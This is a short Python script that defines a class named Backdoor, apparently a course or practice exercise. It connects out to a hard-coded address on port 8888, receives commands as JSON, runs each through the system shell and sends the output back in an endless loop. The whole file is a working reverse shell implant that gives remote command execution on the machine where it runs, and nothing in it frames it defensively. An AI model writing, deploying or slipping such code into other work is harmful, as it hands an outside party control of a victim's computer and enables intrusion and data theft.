#!/usr/bin/env python

import socket
import subprocess
import json


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        It keeps on appending to json_data until it receives the full data
        :return: string
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = execute_system_command(command)
            self.reliable_send(command_result)
        self.connection.close()


my_backdoor = Backdoor("192.168.225.95", 8888)
my_backdoor.run()
